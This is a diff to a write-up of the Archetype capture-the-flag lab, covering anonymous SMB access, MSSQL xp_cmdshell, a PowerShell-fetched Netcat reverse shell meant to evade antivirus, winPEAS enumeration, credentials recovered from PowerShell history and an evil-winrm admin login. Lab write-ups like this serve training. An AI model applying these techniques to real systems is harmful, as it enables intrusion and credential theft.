@@ -26,8 +26,8 @@ We can gather information about files that shared through system via smb service
 ```smbclient -L //ip-address/ ```
 ![smb](/assets/img/Archetype/smb.png)
 
-There is the only shared folder that we can access without permission is **backups**, get a connection by ```smbclient //ip-address/shared-folder ```.
-After the connection had established, I discovered a file called **"prod.dtsConfig"** and download it by **get** command
+There is the only shared folder that we can access without permission **"backups"**, establish a connection using ```smbclient //ip-address/shared-folder ```.
+After the connection was established, the file called **"prod.dtsConfig"** was discovered and downloaded  by **get** command.
 ![prod](/assets/img/Archetype/prod.png)
 
 
@@ -48,7 +48,7 @@ To enable it : ```enable_xp_cmdshell ```,then test with the basic line **xp_cmds
 ## **Exploitation**
 
 
-Because Windows doesn't support Bash shell, we will use Powershell to download Netcat and execute it on victim's machine to achieve a reverse shell, while avoiding antivirus software. First, we located the file location, then change directory to the exact path which contained the file, mine is nc.exe.
+Because Windows doesn't support Bash shell, we will use PowerShell to download Netcat and execute it on victim's machine to achieve a reverse shell, while avoiding antivirus software. First, we located the file location, then change directory to the exact path which contained the file, mine is nc.exe.
 
 Next, we prepared a Python HTTP server to transfer the file.
 ![enable](/assets/img/Archetype/python_nc.png)
@@ -72,4 +72,40 @@ by ```xp_cmdshell "powershell <location of the file>  <destination> <port> <acti
 ![nc](/assets/img/Archetype/nc.png)
 
 ![rev](/assets/img/Archetype/rev.png)
+
+User flag can be obtained from ```C:\Users\sql_svc\Desktop ```
+![userflag](/assets/img/Archetype/userflag.png)
+
+
+## **Privilege Escalation**
+
+To enumerate vulnerability on windows, use **winPEAS**. we will use the same method as before, by transfer winPEAS to target machine and execute to themself
+![winpeas](/assets/img/Archetype/winpeas.png)
+![pythonwinpeas](/assets/img/Archetype/python_winpeas.png)
+
+
+Use **iwr** (Inwoke web request) to download the file, then execute it to trigger vulnerability enumeration
+![winpeasxp_cmdshell](/assets/img/Archetype/winpeas_xp_cmdshell.png)
+
+![winpeas.exe|697](/assets/img/Archetype/winpeas.exe.png)
+
+Here is a brief of the procedure :s
+![wp](/assets/img/Archetype/wp.png)
+
+
+There is still a PowerShell command history exposed here.
+![pshistory](/assets/img/Archetype/ps_history.png)
+
+![history](/assets/img/Archetype/history.png)
+
+After that, we can use the ``` "type"``` command for Windows to read the file contents. We also discovered exposed credentials, which allow us to gain administrative access
+
+
+Next, we used evil-winrm  to obtain remote access because access to this service is restricted to Administrators only.
+```evil-winrm -i <ip> -u <usrname> -p <password>```
+![evil-winrm](/assets/img/Archetype/evil-winrm.png)
+
+Root flag was discovered at ```C:\Users\Administrator\Desktop ```. Since we were in a PowerShell session, the **ls** command was available.
+![rootflag](/assets/img/Archetype/rootflag.png)
+
 
